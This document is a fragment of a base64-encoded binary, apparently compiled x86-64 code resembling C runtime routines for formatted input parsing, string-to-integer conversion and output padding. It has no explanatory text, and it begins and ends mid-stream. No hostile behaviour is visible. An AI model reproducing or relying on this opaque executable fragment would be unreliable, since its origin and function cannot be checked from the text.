YO9nAAAAAB5n0iLhaAAAAAPtgCEwA+EiQAAAEiLhaAAAABIOYWwAAAAD4MPAQAAi0X8SI1NEEiLlVABAABBuQAAAABJiciJweic2P//6yhIi4WgAAAAD7YAD7bASI1NEEiLlVABAABBuQEAAABJiciJwehy2P//SIOtoAAAAAFIi4WgAAAASDmFsAAAAHLASIuFoAAAAA+2AA+2wIlF/OmaAAAAg73cAAAAAH4Mi4WcAAAAiYXcAAAASIOtyAAAAAFIi00ASI1VCEiLhcgAAABJichIicHoytz//0iJRQBEi0X8SItNAEiLhcgAAABIjVABSImVyAAAAEgByESJwogQg73cAAAAAH4Hg63cAAAAAUiNVRBIi4VQAQAASInB6HXY//+JRfyLRfyD+P90EIO93AAAAAAPheP9///rAZBIg73IAAAAAHQoSIO9yAAAAAEPhdYAAABIi0UAD7YAPCt0D0iLRQAPtgA8LQ+FvAAAAEiDvcgAAAAAdW6LhdgAAACD4CCFwHRhSI1N/EiNVRBIi4VQAQAATI0NZPkDAEmJyEiJweg42f//hcB0PEiLTQBIjVUISIuFyAAAAEmJyEiJweje2///SIlFAEiLTQBIi4XIAAAASI1QAUiJlcgAAABIAcjGADDrYotF/EiNTRBIi5VQAQAAQbkAAAAASYnIicHo4tb//0mJ6EiLjfgAAABIjVUYi4XsAAAATYnBSYnIicHoZdr//+nTHAAAi0X8SI1NEEiLlVABAABBuQAAAABJiciJweie1v//SItNAEiNVQhIi4XIAAAASYnISInB6EDb//9IiUUASItNAEiLhcgAAABIjVABSImVyAAAAEgByMYAAIuF2AAAAIPgCIXAdEuLhdgAAACD4BCFwHQfSItFAIuN1AAAAEiNVehBichIicHoOiMAAEiJRcjrZkiLRQCLjdQAAABIjVXoQYnISInB6KslAABIiUXI60eLhdgAAACD4BCFwHQeSItFAIuN1AAAAEiNVehBichIicHoh8MAAIlFyOscSItFAIuN1AAAAEiNVehBichIicHoccMAAIlFyEiLVQBIi0XoSDnCdSZJiehIi434AAAASI1VGIuF7AAAAE2JwUmJyInB6DvZ///pqRsAAIuF2AAAACWAAAAAhcAPhRAbAACLhdgAAACD4BCFwA+EWAEAAIuF2AAAAIPgC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ciJwehtx///6dsJAABIx4UIAQAAZAAAALlkAAAA6OiwAABIicJIi4X4AAAASIkQSIuF+AAAAEiLAEiJhQABAABIg70AAQAAAHU8i4XYAAAAJQAEAACFwHUIi4XsAAAA6wW4/////0mJ6EiLjfgAAABIjVUYTYnBSYnIicHo9Mb//+liCQAASItFGEiJweimx///SIlFGEiLTRhIi0UYSIsQTI1CAUyJAEiDwgJIi4X4AAAASIkE0ettg73gAAAAAHQei5XgAAAASIuFYAEAAEiJwegzwv//SImFAAEAAOsWSItF8EiNUAhIiVXwSIsASImFAAEAAEiDvQABAAAAdSZJiehIi434AAAASI1VGIuF7AAAAE2JwUmJyInB6FTG///pwggAAEiLhRgBAAAPtgA8Xg+UwIiFvQAAAEiLhRgBAAAPtgA8XnUISIOFGAEAAAGDvdwAAAAAeQrHhdwAAAD///9/SItFCEg9/wAAAHctSMdFCAABAABIi0UASIXAdAxIi0UASInB6D2vAABIi0UISInB6HGvAABIiUUASItFAEG4AAEAALoAAAAASInB6HavAABIi4UYAQAAD7YAiIXnAAAAgL3nAAAAXXQNgL3nAAAALQ+FtAAAAEiLVQAPtoXnAAAASAHQxgABSIOFGAEAAAHplgAAAIC95wAAAC11fEiLhRgBAAAPtgCEwHRuSIuFGAEAAA+2ADxddGBIi4UYAQAASIPoAg+2AInCSIuFGAEAAA+2ADjQckJIi4UYAQAASIPoAg+2AIiF5wAAAOsYSItVAA+2hecAAABIAdDGAAGAhecAAAABSIuFGAEAAA+2ADiF5wAAAHLW6xFIi1UAD7aF5wAAAEgB0MYAAUiLhRgBAABIjVABSImVGAEAAA+2AIiF5wAAAIC95wAAAAB0DYC95wAAAF0PhTn///+AvecAAAAAdSZJiehIi434AAAASI1VGIuF7AAAAE2JwUmJyInB6IzE///p+gYAAIuF2AAAAIPgBIXAD4RsAwAASItFEEiJRVBIx4UQAQAAAAAAAEiNVRBIi4VQAQAASInB6FzB//+JRfyLRfyD+P91NoO97AAAAAB0CIuF7AAAAOsFuP////9JiehIi434AAAASI1VGE2JwUmJyInB6BTE///pggYAAEiNRdBBuAgAAAC6AAAAAEiJweitrQAASItVAItF/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